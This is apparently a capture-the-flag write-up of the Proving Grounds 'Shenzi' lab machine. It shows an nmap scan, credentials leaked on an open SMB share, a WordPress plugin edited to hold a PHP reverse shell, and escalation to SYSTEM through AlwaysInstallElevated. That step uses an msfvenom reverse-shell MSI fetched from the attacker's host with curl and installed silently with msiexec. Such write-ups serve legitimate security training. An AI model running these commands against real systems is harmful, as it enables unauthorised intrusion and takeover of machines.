# **Shenzi | PG Practice**


- Running an nmap scan we have

```bash
# Nmap 7.94SVN scan initiated Sat Aug 10 07:58:08 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.158.55
Increasing send delay for 192.168.158.55 from 0 to 5 due to 333 out of 831 dropped probes since last increase.
Warning: 192.168.158.55 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.158.55
Host is up (0.15s latency).
Not shown: 44007 closed tcp ports (conn-refused), 21514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.158.55/dashboard/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.158.55/dashboard/
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   GenericLines, HTTPOptions, LANDesk-RC, LDAPSearchReq, LPDString, NULL, NotesRPC, RPCCheck, SIPOptions, SMBProgNeg, TerminalServerCookie, WMSRequest, X11Probe, ms-sql-s, oracle-tns: 
|_    Host '192.168.45.228' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  tcpwrapped
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
--SNIP--
Host script results:
| smb2-time: 
|   date: 2024-08-10T07:05:04
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 10 08:05:22 2024 -- 1 IP address (1 host up) scanned in 434.02 seconds
```

- We don't have anonymous access to FTP

```bash
❯ ftp 192.168.158.55
Connected to 192.168.158.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.158.55:sec-fortress): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
ftp> 
```

- Checking the SMB protocol with `smbclient` we have one share looking interesting

```bash
❯ smbclient -L \\\\192.168.158.55\\ 
Password for [WORKGROUP\sec-fortress]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.158.55 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```



- Connected to the SMB share as a NULL user and downloaded all files

```bash
❯ smbclient \\\\192.168.158.55\\Shenzi\\
Password for [WORKGROUP\sec-fortress]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu May 28 16:45:09 2020
  ..                                  D        0  Thu May 28 16:45:09 2020
  passwords.txt                       A      894  Thu May 28 16:45:09 2020
  readme_en.txt                       A     7367  Thu May 28 16:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Thu May 28 16:45:09 2020
  why.tmp                             A      213  Thu May 28 16:45:09 2020
  xampp-control.ini                   A      178  Thu May 28 16:45:09 2020

                12941823 blocks of size 4096. 5862162 blocks available
smb: \> mget *
Get file passwords.txt? y
getting file \passwords.txt of size 894 as passwords.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
Get file readme_en.txt? y
getting file \readme_en.txt of size 7367 as readme_en.txt (9.7 KiloBytes/sec) (average 4.9 KiloBytes/sec)
Get file sess_klk75u2q4rpgfjs3785h6hpipp? y
getting file \sess_klk75u2q4rpgfjs3785h6hpipp of size 3879 as sess_klk75u2q4rpgfjs3785h6hpipp (5.2 KiloBytes/sec) (average 5.0 KiloBytes/sec)
Get file why.tmp? y
getting file \why.tmp of size 213 as why.tmp (0.3 KiloBytes/sec) (average 4.0 KiloBytes/sec)
Get file xampp-control.ini? y
getting file \xampp-control.ini of size 178 as xampp-control.ini (0.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
smb: \> 
```



- The `passwords.txt` file was the most interesting cos' it contains credentials of different web services

```bash
❯ \cat passwords.txt
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```



- We have wordpress credentials hehe, But for some reason i can't seem to find that endpoint even with few directory fuzzing 



![image](https://github.com/user-attachments/assets/cf1762f5-beb3-4105-b41f-c0ebff23d223)



- So what i did was guess the wordpress site which was unrealistic and took me some time to guess. I was so pissed off cos' the wordpress endpoint was called '**shenzi**', damn just the name of the box :tired_face:



![image](https://github.com/user-attachments/assets/b390ba6b-0322-4f2e-baaa-3c4c737ccb0f)



- So let go ahead and login with the wordpress credentials we have at hand at http://192.168.158.55/shenzi/wp-admin/
- Once logged in we can attempt to gain a reverse shell by editing a plugin with the "*Plugin Editor*" and replacing any `.php` file with our reverse shell
- Then accessing the plugin at `http://192.168.158.55/shenzi/wp-content/plugins/<plugin name>/<edited.php>/`

 

```bash
❯ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.158.55] 51139
whoami
shenzi\shenzi
PS C:\xampp\htdocs\shenzi\wp-content\plugins> hostname
shenzi
PS C:\xampp\htdocs\shenzi\wp-content\plugins> 
```



- Found this on `winpeas.exe`

[https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)

![](https://i.imgur.com/oODmJHM.png)

> **If** these 2 registers are **enabled** (value is **`0x1`**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.



- We can also confirm this manually 

```powershell
C:\Shenzi>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Shenzi>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```



- To exploit this first create a `msfvenom` payload to attempt to gain reverse shell as administrator 



```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 lport=4444 -a x64 --platform windows -f msi -o ignite.msi
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: ignite.msi
```



- Transfer the `*.msi` file to target system



````powershell
C:\Shenzi>curl http://192.168.45.228/ignite.msi -o ignite.msi
curl http://192.168.45.228/ignite.msi -o ignite.msi
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  156k  100  156k    0     0   155k      0  0:00:01  0:00:01 --:--:--  155k
````



- Then start up a listener and install the package using the **`msiexec`** command line utility.

```powershell
PS C:\users\public> msiexec /quiet /qn /i ignite.msi

# Listerner
rlwrap nc -lvnp 4444
```



![image-20240810204327108](https://github.com/user-attachments/assets/41efa32b-8660-4dfd-b94b-b26a0e7aca28)

